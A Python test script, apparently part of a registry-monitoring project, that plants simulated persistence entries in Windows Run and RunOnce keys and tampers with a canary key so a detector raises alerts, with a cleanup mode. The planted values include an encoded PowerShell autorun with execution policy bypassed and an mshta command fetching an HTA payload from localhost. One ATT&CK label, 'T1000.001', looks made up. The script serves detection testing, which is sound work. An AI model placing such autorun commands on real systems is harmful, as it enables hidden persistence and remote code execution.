import winreg
import sys
import time
import argparse

RUN_PATH = r"Software\Microsoft\Windows\CurrentVersion\Run"
RUNONCE_PATH = r"Software\Microsoft\Windows\CurrentVersion\RunOnce"
CANARY_PATH = r"Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\SystemPersistenceCheck"

TEST_ENTRIES = [
    {
        "root": winreg.HKEY_CURRENT_USER,
        "subkey": RUN_PATH,
        "name": "SecUpdateMockTest",
        "value": "powershell.exe -NoP -ExecutionPolicy Bypass -enc JAB4ACAAPQAgACcAdABlAHMAdAAnAA==",
        "type": winreg.REG_SZ,
        "desc": "Simulated Encoded PowerShell Run Persistence (T1547.001 / T1059.001)"
    },
    {
        "root": winreg.HKEY_CURRENT_USER,
        "subkey": RUNONCE_PATH,
        "name": "LOLBinSimTest",
        "value": "mshta.exe http://127.0.0.1:8000/payload.hta",
        "type": winreg.REG_SZ,
        "desc": "Simulated LOLBin MSHTA Invocation (T1218 / T1547.001)"
    }
]

def inject_test_persistence():
    print("[*] ========================================================")
    print("[*] INJECTING SIMULATED PERSISTENCE REGISTRY ENTRIES")
    print("[*] ========================================================\n")

    for entry in TEST_ENTRIES:
        try:
            with winreg.OpenKey(entry["root"], entry["subkey"], 0, winreg.KEY_SET_VALUE) as key:
                winreg.SetValueEx(key, entry["name"], 0, entry["type"], entry["value"])
                print(f"[+] Injected: {entry['desc']}")
                print(f"    Key   : HKCU\\{entry['subkey']}")
                print(f"    Value : {entry['name']}")
                print(f"    Data  : {entry['value']}\n")
        except Exception as e:
            print(f"[-] Failed to inject test entry: {e}")

    # Also touch the Canary Honey-Key to test Canary alarm
    try:
        with winreg.CreateKey(winreg.HKEY_CURRENT_USER, CANARY_PATH) as key:
            winreg.SetValueEx(key, "IntegrityToken", 0, winreg.REG_SZ, "TAMPERED_BY_SIMULATOR")
            print("[+] Triggered Canary Honey-Key Decoy (T1000.001)\n")
    except Exception as e:
        print(f"[-] Canary trigger error: {e}")

    print("[+] Attack simulation injected successfully!")
    print("[*] Watch the Real-Time Monitor terminal or Web Dashboard to observe zero-latency alert detection.")
    print("[*] Run `python tools/simulate_attack.py --cleanup` when finished testing.\n")

def cleanup_test_persistence():
    print("[*] Cleaning up simulated persistence entries...")

    for entry in TEST_ENTRIES:
        try:
            with winreg.OpenKey(entry["root"], entry["subkey"], 0, winreg.KEY_SET_VALUE) as key:
                winreg.DeleteValue(key, entry["name"])
                print(f"[+] Deleted test value: {entry['name']}")
        except FileNotFoundError:
            pass
        except Exception as e:
            print(f"[-] Cleanup error: {e}")

    # Restore Canary
    try:
        with winreg.CreateKey(winreg.HKEY_CURRENT_USER, CANARY_PATH) as key:
            winreg.SetValueEx(key, "IntegrityToken", 0, winreg.REG_SZ, "SYSTEM_CANARY_ACTIVE_HONEYPOT")
            print("[+] Restored Canary Honey-Key to default state.")
    except Exception as e:
        print(f"[-] Canary restore error: {e}")

    print("[+] Cleanup complete. System restored.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Safe Registry Persistence Simulation Tool")
    parser.add_argument("--cleanup", action="store_true", help="Remove all simulated persistence entries")
    args = parser.parse_args()

    if args.cleanup:
        cleanup_test_persistence()
    else:
        inject_test_persistence()
